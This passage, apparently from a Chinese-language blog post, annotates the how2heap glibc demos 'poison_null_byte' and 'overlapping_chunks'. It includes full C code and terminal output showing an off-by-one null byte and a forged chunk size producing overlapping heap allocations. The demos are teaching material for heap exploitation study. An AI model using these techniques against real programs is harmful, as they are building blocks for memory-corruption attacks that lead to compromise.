real_a_size);<br><br><br><br><span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * the amount requested plus some amount required for the metadata. */</span><br><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><br><br>c = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br><br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-comment">// barrier是为了防止堆块c与top chunk合并</span><br><span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><br><span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><br><span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><br><span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-comment">// glibc2.26中对释放的当前堆块大小和下一个堆块的prev_size的大小作比较以对抗单字节溢出</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><br><span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><br><span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><br><span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br><br>*(<span class="hljs-type">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><br><span class="hljs-comment">// 这项技术会用于溢出改写一个释放的堆块</span><br><span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><br><span class="hljs-built_in">free</span>(b);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br><span class="hljs-comment">// 使b的大小收缩</span><br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><br><br><span class="hljs-type">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><br><br><span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><br><span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><br><span class="hljs-comment">// will detect the heap corruption now.</span><br><br><span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// 这里我们看到b的size为0x200（被修改之前是0x210）</span><br><span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// 下一个chunk的位置所在</span><br><span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// 为了绕过检查，我们需要在下一个chunk的pre_sive写上我们堆块b的大小</span><br><span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br><br>*((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-type">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br><br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-comment">// 现在我们申请的b1会在b所在的位置</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-comment">// 本该chunk c的pre_size应该被更新，但是实际上没有</span><br><span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-comment">// 事实上，在chunk c的上方0x10偏移处的地方更新了pre_size，即为0xf0</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><br><span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-type">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-comment">// 这里我们将申请即将被覆盖的堆块</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><br><span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br><br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><br><span class="hljs-comment">// 当我们free b1和c时，将会跳过b2直接合并，再次分配时，就会产生堆块重叠</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">free</span>(b1);<br><br><span class="hljs-built_in">free</span>(c);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br><br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br><br><span class="hljs-comment">// 现在堆块d和b2重叠</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><br><span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br><br><br>assert(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/off_by_one$ ./poison_null_byte<br>Welcome to poison null byte <span class="hljs-number">2.0</span>!<br>Tested in Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64b</span>it.<br>This technique only works with disabled tcache-option <span class="hljs-keyword">for</span> glibc, see build_glibc.sh <span class="hljs-keyword">for</span> build instructions.<br>This technique can be used when you have an off-by-one into a <span class="hljs-built_in">malloc</span><span class="hljs-number">&#x27;</span>ed region with a null byte.<br>We allocate <span class="hljs-number">0x100</span> bytes <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;a&#x27;</span>.<br>a: <span class="hljs-number">0xe29010</span><br>Since we want to overflow <span class="hljs-string">&#x27;a&#x27;</span>, we need to know the <span class="hljs-string">&#x27;real&#x27;</span> size of <span class="hljs-string">&#x27;a&#x27;</span> (it may be more than <span class="hljs-number">0x100</span> because of rounding): <span class="hljs-number">0x108</span><br>b: <span class="hljs-number">0xe29120</span><br>c: <span class="hljs-number">0xe29330</span><br>We allocate a barrier at <span class="hljs-number">0xe29440</span>, so that c is not consolidated with the top-chunk when freed.<br>The barrier is not strictly necessary, but makes things less confusing<br>In newer versions of glibc we will need to have our updated size inside b itself to pass the check <span class="hljs-string">&#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;</span><br>b.size: <span class="hljs-number">0x211</span><br>b.size is: (<span class="hljs-number">0x200</span> + <span class="hljs-number">0x10</span>) | prev_in_use<br>We overflow <span class="hljs-string">&#x27;a&#x27;</span> with a single null byte into the metadata of <span class="hljs-string">&#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0x200</span><br>c.prev_size is <span class="hljs-number">0x210</span><br>We will pass the check since <span class="hljs-title function_">chunksize</span><span class="hljs-params">(P)</span> == <span class="hljs-number">0x200</span> == <span class="hljs-number">0x200</span> == prev_size (next_chunk(P))<br>b1: <span class="hljs-number">0xe29120</span><br>Now we <span class="hljs-built_in">malloc</span> <span class="hljs-string">&#x27;b1&#x27;</span>. It will be placed where <span class="hljs-string">&#x27;b&#x27;</span> was. At this point c.prev_size should have been updated, but it was not: <span class="hljs-number">0x210</span><br>Interestingly, the updated value of c.prev_size has been written <span class="hljs-number">0x10</span> bytes before c.prev_size: f0<br>We <span class="hljs-built_in">malloc</span> <span class="hljs-string">&#x27;b2&#x27;</span>, our <span class="hljs-string">&#x27;victim&#x27;</span> chunk.<br>b2: <span class="hljs-number">0xe29230</span><br>Current b2 content:<br>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB<br>Now we <span class="hljs-built_in">free</span> <span class="hljs-string">&#x27;b1&#x27;</span> and <span class="hljs-string">&#x27;c&#x27;</span>: this will consolidate the chunks <span class="hljs-string">&#x27;b1&#x27;</span> and <span class="hljs-string">&#x27;c&#x27;</span> (forgetting about <span class="hljs-string">&#x27;b2&#x27;</span>).<br>Finally, we allocate <span class="hljs-string">&#x27;d&#x27;</span>, overlapping <span class="hljs-string">&#x27;b2&#x27;</span>.<br>d: <span class="hljs-number">0xe29120</span><br>Now <span class="hljs-string">&#x27;d&#x27;</span> and <span class="hljs-string">&#x27;b2&#x27;</span> overlap.<br>New b2 content:<br>DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD<br>Thanks to https:<span class="hljs-comment">//www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.</span><br></code></pre></td></tr></table></figure><h2 id="Overlapping"><a href="#Overlapping" class="headerlink" title="Overlapping"></a>Overlapping</h2><h3 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h3><p>从unsortedbin中取出chunk的时候，只会简单的检查其size是否在合理的范围之内，而不会去检查和当前bins的标志大小是否相同，所以当我们取出的chunk符合要求就会返还给我们。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">扩展已释放的堆块</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> A simple tale of overlapping chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> This technique is taken from</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span>&#123;<br><br><br><br><br><br><span class="hljs-type">intptr_t</span> *p1,*p2,*p3,*p4;<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);<br><br><br><br>p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br>p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);<br><br><br><br><span class="hljs-built_in">memset</span>(p1, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">memset</span>(p2, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x100</span> - <span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x80</span> - <span class="hljs-number">8</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(p2);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);<br><br><br><span class="hljs-comment">// 假设有一个堆溢出漏洞能够改写堆块p2的大小</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span><br><span class="hljs-comment">// 我们最好还是保留堆块的标志位</span><br><span class="hljs-string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span><br><span class="hljs-comment">// 防止堆块p1被误认为释放的chunk</span><br><span class="hljs-string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);<br><br><br><br><span class="hljs-type">int</span> evil_chunk_size = <span class="hljs-number">0x181</span>;<span class="hljs-comment">// 恶意的chunk的size</span><br><br><span class="hljs-type">int</span> evil_region_size = <span class="hljs-number">0x180</span> - <span class="hljs-number">8</span>;<span class="hljs-comment">// 我们请求的chunk的大小</span><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,<br><br> evil_chunk_size, evil_region_size);<br><br><br><span class="hljs-comment">// 修改堆块p2的大小为恶意的size</span><br>*(p2<span class="hljs-number">-1</span>) = evil_chunk_size; <span class="hljs-comment">// we are overwriting the &quot;size&quot; field of chunk p2</span><br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span><br><br>       <span class="hljs-string">&quot;size of the chunk p2 injected size\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span><br><br>       <span class="hljs-string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);<br><br>p4 = <span class="hljs-built_in">malloc</span>(evil_region_size);<br><br><br><span class="hljs-comment">// p4开始的位置和结束的位置</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p4, (<span class="hljs-type">char</span> *)p4+evil_region_size);<br><span class="hljs-comment">// p3开始的位置和结束的位置</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="hljs-type">char</span> *)p3, (<span class="hljs-type">char</span> *)p3+<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);<br><br><br><span class="hljs-comment">// 造成堆块重叠</span><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span><br><br><span class="hljs-string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);<br><br><span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, evil_region_size);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br><br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);<br><br><span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p4 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p4);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;p3 = %s\n&quot;</span>, (<span class="hljs-type">char</span> *)p3);<br><br>&#125;<br><br><br>zyy@zyy-virtual-machine:~/pwn/how2heap/overlapping$ ./overlapping_chunks<br><br>This is a simple chunks overlapping problem<br><br>Let<span class="hljs-number">&#x27;</span>s start to allocate <span class="hljs-number">3</span> chunks on the heap<br>The <span class="hljs-number">3</span> chunks have been allocated here:<br>p1=<span class="hljs-number">0x24e4010</span><br>p2=<span class="hljs-number">0x24e4110</span><br>p3=<span class="hljs-number">0x24e4210</span><br><br>Now let<span class="hljs-number">&#x27;</span>s <span class="hljs-built_in">free</span> the chunk p2<br>The chunk p2 is now in the unsorted bin ready to serve possible<br>new <span class="hljs-built_in">malloc</span>() of its size<br>Now let<span class="hljs-number">&#x27;</span>s simulate an overflow that can overwrite the size of the<br>chunk freed p2.<br>For a toy program, the value of the last <span class="hljs-number">3</span> bits is unimportant; however, it is best to maintain the stability of the heap.<br>To achieve this stability we will mark the least signifigant bit as <span class="hljs-number">1</span> (prev_inuse), to assure that p1 is not mistaken <span class="hljs-keyword">for</span> a <span class="hljs-built_in">free</span> chunk.<br>We are going to <span class="hljs-built_in">set</span> the size of chunk p2 to to <span class="hljs-number">385</span>, which gives us<br>a region size of <span class="hljs-number">376</span><br><br>Now let<span class="hljs-number">&#x27;</span>s allocate another chunk with a size equal to the data<br>size of the chunk p2 injected size<br>This <span class="hljs-built_in">malloc</span> will be served from the previously freed chunk that<br>is parked in the unsorted bin which size has been modified by us<br><br>p4 has been allocated at <span class="hljs-number">0x24e4110</span> and ends at <span class="hljs-number">0x24e4288</span><br>p3 starts at <span class="hljs-number">0x24e4210</span> and ends at <span class="hljs-number">0x24e4288</span><br>p4 should overlap with p3, in this <span class="hljs-keyword">case</span> p4 includes all p3.<br><br>Now everything copied inside chunk p4 can overwrites data on<br>chunk p3, and data written to chunk p3 can overwrite data<br>stored in the p4 chunk.<br><br>Let<span class="hljs-number">&#x27;</span>s run through an example. Right now, we have:<br>p4 = x����<br>p3 = <span class="hljs-number">333333333333333333333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">33333333333333333333333333333333333333333333</span>�<br><br>If we <span class="hljs-built_in">memset</span>(p4, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">376</span>), we have:<br>p4 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span><span class="hljs-number">444444444444444444444444444444444444444444444444444444444444</span>�<br>p3 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444</span><span class="hljs-number">44444444444444444444444444444444444444444444</span>�<br><br>And <span class="hljs-keyword">if</span> we then <span class="hljs-built_in">memset</span>(p3, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">80</span>), we have:<br>p4 = <span class="hljs-number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333</span><span class="hljs-number">333333333333333333334444444444444444444444444444444444444444</span>�<br>p3 = <span class="hljs-number">333333333333333333333333333333333333333333333333333333333333333333333333333</span><span 